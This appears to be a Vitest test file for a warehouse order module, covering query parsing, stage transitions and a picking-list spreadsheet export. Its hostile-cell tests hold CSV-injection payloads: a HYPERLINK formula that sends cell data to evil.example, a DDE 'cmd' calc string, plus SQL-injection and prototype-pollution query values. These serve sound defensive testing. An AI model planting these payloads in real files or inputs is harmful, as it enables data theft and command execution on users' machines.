import { describe, expect, it } from "vitest"

import {
  PICKING_LIST_HEADERS,
  WAREHOUSE_DELIVERED_DAYS_DEFAULT,
  WAREHOUSE_DELIVERED_DAYS_MAX,
  WAREHOUSE_ORDER_PAGE_SIZE_DEFAULT,
  WAREHOUSE_ORDER_PAGE_SIZE_MAX,
  buildPickingListRows,
  lineAmountCents,
  parseRouteId,
  parseWarehouseOrderListQuery,
  isWarehouseWorkStatus,
  timelineUnavailableReason,
  warehouseNextStage,
} from "@/lib/warehouse-orders"

const parse = (query: string) => parseWarehouseOrderListQuery(new URLSearchParams(query))

/** Would a spreadsheet read this cell as a formula? Leading whitespace and control characters are skipped, as Excel does. */
function looksLikeFormula(cell: string): boolean {
  let index = 0
  while (index < cell.length && cell.charCodeAt(index) <= 0x20) index += 1
  return index < cell.length && "=+-@".includes(cell[index])
}

describe("the queue's query string", () => {
  it("defaults to open orders, first page, default size", () => {
    expect(parse("")).toEqual({
      ok: true,
      value: {
        view: "open",
        stage: null,
        paymentStatus: null,
        organizationId: null,
        branchId: null,
        search: "",
        deliveredWithinDays: WAREHOUSE_DELIVERED_DAYS_DEFAULT,
        includeLines: false,
        page: 1,
        limit: WAREHOUSE_ORDER_PAGE_SIZE_DEFAULT,
      },
    })
  })

  it("reads every filter", () => {
    const result = parse("view=delivered&stage=out_for_delivery&paymentStatus=paid&organizationId=4&branchId=9&q=%20INV-7%20&days=7&lines=1&page=3&limit=50")
    expect(result).toEqual({
      ok: true,
      value: {
        view: "delivered",
        stage: "OUT_FOR_DELIVERY",
        paymentStatus: "PAID",
        organizationId: 4,
        branchId: 9,
        search: "INV-7",
        deliveredWithinDays: 7,
        includeLines: true,
        page: 3,
        limit: 50,
      },
    })
  })

  it("bounds the page size and the day window", () => {
    const result = parse("limit=5000&days=9999&page=0")
    expect(result.ok && result.value.limit).toBe(WAREHOUSE_ORDER_PAGE_SIZE_MAX)
    expect(result.ok && result.value.deliveredWithinDays).toBe(WAREHOUSE_DELIVERED_DAYS_MAX)
    expect(result.ok && result.value.page).toBe(1)
  })

  it.each([
    ["an unknown key", "orgId=4"],
    ["an unknown view", "view=pending"],
    ["an unknown stage", "stage=FULFILLED"],
    ["an unknown payment status", "paymentStatus=SETTLED"],
    ["a non-numeric organization", "organizationId=1%20OR%201%3D1"],
    ["a negative branch", "branchId=-3"],
    ["a decimal branch", "branchId=3.5"],
    ["a long search", `q=${"x".repeat(101)}`],
    ["a bad lines flag", "lines=yes"],
  ])("refuses %s rather than ignoring it", (_label, query) => {
    expect(parse(query).ok).toBe(false)
  })
})

describe("route ids", () => {
  it("are positive safe integers only", () => {
    expect(parseRouteId("42")).toBe(42)
    for (const raw of ["0", "-1", "1.5", "abc", "1e3", "", "9007199254740993", "42 "]) {
      expect(parseRouteId(raw), raw).toBeNull()
    }
  })
})

describe("the next stage", () => {
  it("moves an approved order one stage forward", () => {
    expect(warehouseNextStage({ status: "APPROVED", fulfillmentStatus: "NOT_STARTED" })).toBe("IN_PROCESS")
    expect(warehouseNextStage({ status: "approved", fulfillmentStatus: null })).toBe("IN_PROCESS")
    expect(warehouseNextStage({ status: "APPROVED", fulfillmentStatus: "IN_PROCESS" })).toBe("OUT_FOR_DELIVERY")
    expect(warehouseNextStage({ status: "APPROVED", fulfillmentStatus: "OUT_FOR_DELIVERY" })).toBe("DELIVERED")
  })

  it("offers nothing once delivered, or for an order that is not approved", () => {
    expect(warehouseNextStage({ status: "APPROVED", fulfillmentStatus: "DELIVERED" })).toBeNull()
    for (const status of ["PENDING", "REJECTED", "CANCELLED", "FULFILLED", "REFUNDED", null]) {
      expect(warehouseNextStage({ status, fulfillmentStatus: "NOT_STARTED" }), String(status)).toBeNull()
    }
  })
})

describe("why an order has no timeline", () => {
  it("names a missing approval time, not the cutoff, when there is none", () => {
    for (const approvedAt of [null, undefined, "", "not a date"]) {
      expect(timelineUnavailableReason(approvedAt), String(approvedAt)).toMatch(/no recorded approval time/)
    }
  })

  it("names the cutoff for an order approved before 1 September 2026 (Karachi)", () => {
    expect(timelineUnavailableReason("2026-08-31T18:59:59.000Z")).toMatch(/approved since 1 September 2026/)
  })

  it("falls back to a general reason for an order approved since the cutoff", () => {
    const reason = timelineUnavailableReason("2026-08-31T19:00:00.000Z")
    expect(reason).not.toMatch(/approval time|1 September/)
    expect(reason).toMatch(/not part of the delivery dashboard/)
  })
})

describe("line amounts", () => {
  it("multiply the unit price by the quantity, in whole cents", () => {
    expect(lineAmountCents({ priceCents: 35_500, quantity: 2 })).toBe(71_000)
    expect(lineAmountCents({ priceCents: 999, quantity: 1.5 })).toBe(1499)
    expect(lineAmountCents({ priceCents: 1000, quantity: 0.333 })).toBe(333)
  })
})

describe("the picking list export", () => {
  const order = {
    tid: "T-1",
    invoiceNumber: "INV-9",
    organizationName: "Org",
    branchName: "North",
    destination: "Clifton, Karachi",
    fulfillmentStatus: "IN_PROCESS",
    approvedAt: "2026-10-01T10:00:00.000Z",
    notes: "Gate 2",
    lines: [
      { productCode: "P-1", productName: "Rice", unit: "kg", quantity: 2.5, priceCents: 40_000 },
      { productCode: null, productName: "Tea", unit: "box", quantity: 1, priceCents: 1_250 },
    ],
  }

  it("writes one row per line, in the header's order, with prices in rupees", () => {
    const rows = buildPickingListRows([order])
    expect(rows).toHaveLength(2)
    expect(rows[0]).toHaveLength(PICKING_LIST_HEADERS.length)
    expect(rows[0]).toEqual([
      "T-1", "INV-9", "Org", "North", "Clifton, Karachi", "In Process", "2026-10-01T10:00:00.000Z",
      "P-1", "Rice", 2.5, "kg", 400, 1000, "Gate 2",
    ])
    expect(rows[1].slice(7)).toEqual(["", "Tea", 1, "box", 12.5, 12.5, "Gate 2"])
  })

  it("keeps an order with no lines on the list", () => {
    const rows = buildPickingListRows([{ ...order, lines: [], invoiceNumber: null, notes: null }])
    expect(rows).toEqual([["T-1", "", "Org", "North", "Clifton, Karachi", "In Process", "2026-10-01T10:00:00.000Z", "", "", "", "", "", "", ""]])
  })
})

describe("the picking list export, against hostile cell text", () => {
  // Notes, branch names, delivery-address labels and product names are typed by
  // tenant staff; the file is opened by Apricart's warehouse. A cell starting
  // with = + - @ (or one hidden behind leading whitespace or a control
  // character) would run as a formula in Excel or Sheets — CSV injection.
  const hostile = {
    tid: "T-2",
    invoiceNumber: "=1+1",
    organizationName: "+SUM(A1:A9)",
    branchName: "-2+3",
    destination: "@SUM(1)",
    fulfillmentStatus: "NOT_STARTED",
    approvedAt: null,
    notes: '=HYPERLINK("http://evil.example/?"&A1,"Click")',
    lines: [
      { productCode: " =cmd|' /C calc'!A0", productName: "\t=1+1", unit: "\r@x", quantity: -1, priceCents: 100 },
    ],
  }

  it("never leaves a formula-like string where a spreadsheet would evaluate it", () => {
    const [row] = buildPickingListRows([hostile])
    for (const cell of row) {
      if (typeof cell !== "string") continue
      expect(looksLikeFormula(cell), `cell ${JSON.stringify(cell)}`).toBe(false)
    }
  })

  it("keeps the text readable and leaves numbers as numbers", () => {
    const [row] = buildPickingListRows([hostile])
    expect(row[13]).toBe(`'${hostile.notes}`)
    expect(row[2]).toBe("'+SUM(A1:A9)")
    // A negative quantity is a number, not text a spreadsheet would parse.
    expect(row[9]).toBe(-1)
    expect(row[0]).toBe("T-2")
  })

  it("neutralises the no-lines row too", () => {
    const [row] = buildPickingListRows([{ ...hostile, lines: [] }])
    expect(row[13]).toBe(`'${hostile.notes}`)
  })
})

describe("the queue's query string, at its edges", () => {
  it.each([
    ["a zero id", "branchId=0"],
    ["an id past the safe integer range", "organizationId=9007199254740993"],
    ["an exponent id", "branchId=1e3"],
    ["a hex id", "branchId=0x10"],
    ["an id with trailing text", "branchId=12abc"],
    ["a prototype key", "__proto__=1"],
    ["a constructor key", "constructor=1"],
    ["a lines flag spelt true", "lines=true"],
    ["a stage given twice as junk", "stage=%00"],
  ])("refuses %s", (_label, query) => {
    expect(parse(query).ok).toBe(false)
  })

  it("accepts a search of exactly the maximum length, measured after trimming", () => {
    expect(parse(`q=${"x".repeat(100)}`).ok).toBe(true)
    expect(parse(`q=${encodeURIComponent(`  ${"x".repeat(100)}  `)}`).ok).toBe(true)
  })

  it("reads the view and stage case-insensitively", () => {
    const result = parse("view=DELIVERED&stage=in_process")
    expect(result.ok && result.value.view).toBe("delivered")
    expect(result.ok && result.value.stage).toBe("IN_PROCESS")
  })

  it("falls back to the defaults for a page, size or window that is not a positive number", () => {
    for (const bad of ["-5", "abc", "", "NaN", "Infinity"]) {
      const result = parse(`page=${bad}&limit=${bad}&days=${bad}`)
      expect(result.ok, bad).toBe(true)
      if (!result.ok) continue
      expect(result.value.page, bad).toBe(1)
      expect(result.value.limit, bad).toBe(WAREHOUSE_ORDER_PAGE_SIZE_DEFAULT)
      expect(result.value.deliveredWithinDays, bad).toBe(WAREHOUSE_DELIVERED_DAYS_DEFAULT)
    }
  })

  it("never lets a fractional page reach the offset", () => {
    const result = parse("page=2.9&limit=10.5")
    expect(result.ok && result.value.page).toBe(2)
    expect(result.ok && result.value.limit).toBe(10)
  })

  it("reads only the first of a repeated filter, never a list", () => {
    const result = parse("branchId=4&branchId=9")
    expect(result.ok && result.value.branchId).toBe(4)
  })
})

describe("route ids, at their edges", () => {
  it.each(["0", "-1", "1.0", "1e3", " 1", "1 ", "0x1", "", "9007199254740993", "١٢"])("refuses %j", (raw) => {
    expect(parseRouteId(raw)).toBeNull()
  })
})

describe("what counts as warehouse work", () => {
  it("is an approved order, or a fulfilled one as history", () => {
    for (const status of ["APPROVED", "approved", " Approved ", "FULFILLED", "PARTIAL", "PARTIALLY_FULFILLED"]) {
      expect(isWarehouseWorkStatus(status), status).toBe(true)
    }
  })

  it("is never a pending, returned, rejected, cancelled or refunded order", () => {
    for (const status of ["PENDING", "REJECTED", "CANCELLED", "REFUNDED", "RETURNED", "", null, undefined]) {
      expect(isWarehouseWorkStatus(status), String(status)).toBe(false)
    }
  })
})

describe("the next stage, against odd stored values", () => {
  it("treats a lower-case approved status as approved", () => {
    expect(warehouseNextStage({ status: "approved", fulfillmentStatus: "in_process" })).toBe("OUT_FOR_DELIVERY")
  })

  it("offers nothing for a fulfilled order, even when its stage was never recorded", () => {
    expect(warehouseNextStage({ status: "FULFILLED", fulfillmentStatus: null })).toBeNull()
  })
})
